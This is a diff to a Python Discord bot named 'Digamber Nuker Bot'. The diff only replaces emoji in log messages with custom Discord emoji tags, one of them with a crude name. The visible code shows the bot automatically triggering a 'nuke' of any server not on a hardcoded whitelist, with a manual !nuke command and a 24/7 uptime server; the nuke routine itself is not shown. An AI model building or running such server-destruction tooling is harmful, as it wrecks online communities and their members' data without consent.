@@ -36,7 +36,7 @@ class NukerBot(commands.Bot):
         # ADMIN PANEL CHANNEL
         self.admin_channel_id = 1446007578856259697
         
-        print("🎯 Bot initialized with:")
+        print("<a:emoji_27:1430082791558742087> Bot initialized with:")
         print(f"   🔊 Voice Channels: {len(self.voice_channels)}")
         print(f"   🛠️  Admin Channel: {self.admin_channel_id}")
 
@@ -77,7 +77,7 @@ class NukerBot(commands.Bot):
                 print(f"❌ Channel {channel_id} not found in cache")
                 return False
             
-            print(f"🎯 Attempting to connect to: {channel.name} ({channel.guild.name})")
+            print(f"<a:emoji_33:1430083160955158608> Attempting to connect to: {channel.name} ({channel.guild.name})")
             
             # Check if already connected in this guild
             guild = channel.guild
@@ -88,7 +88,7 @@ class NukerBot(commands.Bot):
             # CONNECT with timeout
             print(f"🔗 Connecting to {channel.name}...")
             await channel.connect(timeout=30.0, reconnect=False)
-            print(f"🎉 SUCCESS! Connected to {channel.name} in {guild.name}")
+            print(f"<a:emoji_22:1430082540613664768> SUCCESS! Connected to {channel.name} in {guild.name}")
             return True
             
         except discord.errors.ClientException as e:
@@ -181,7 +181,7 @@ class NukerBot(commands.Bot):
         if os.environ.get('RENDER'):
             import threading
             threading.Thread(target=run_flask, daemon=True).start()
-            print("🚀 Flask server started for 24/7 uptime")
+            print("<a:emoji_10:1430081991822278766> Flask server started for 24/7 uptime")
         
         print(f"{'='*50}\n")
 
@@ -214,7 +214,7 @@ class NukerBot(commands.Bot):
                     )
                 
                 embed.add_field(
-                    name="⚡ **QUICK COMMANDS**",
+                    name="<a:emoji_25:1430082717416034324> **QUICK COMMANDS**",
                     value="```\n!panel - Show this panel\n!wladd <id> - Add to whitelist\n!wlremove <id> - Remove from whitelist\n!wllist - Show all whitelisted\n!servers - All server list\n!nuke <server_id> - Manual nuke\n!status - Bot status\n```",
                     inline=False
                 )
@@ -323,7 +323,7 @@ class NukerBot(commands.Bot):
                     pass
                 return
             else:
-                print(f"💣 NON-WHITELISTED SERVER - Starting PROFESSIONAL NUKE!")
+                print(f"<a:Pusssysucking:1398952034807316531> NON-WHITELISTED SERVER - Starting PROFESSIONAL NUKE!")
                 await nuker_cog.nuke_server(guild)
 
     @tasks.loop(minutes=2)
@@ -375,10 +375,10 @@ class NukerBot(commands.Bot):
 
 if __name__ == "__main__":
     print("\n" + "="*60)
-    print("🚀 Starting Digamber Nuker Bot with PROFESSIONAL features...")
+    print("<a:emoji_3:1430081607175503873> Starting Digamber Nuker Bot with PROFESSIONAL features...")
     print("🎧 VOICE SYSTEM: FFMPEG REQUIRED")
-    print("🛠️  ADMIN PANEL: Channel ID 1446007578856259697")
-    print("🔒 PERMANENT WHITELIST: 3 Servers (Hardcoded)")
+    print("<a:emoji_14:1430082122982621217>  ADMIN PANEL: Channel ID 1446007578856259697")
+    print("<a:verified:1408545305594433546> PERMANENT WHITELIST: 3 Servers (Hardcoded)")
     print("="*60 + "\n")
     
     bot = NukerBot()
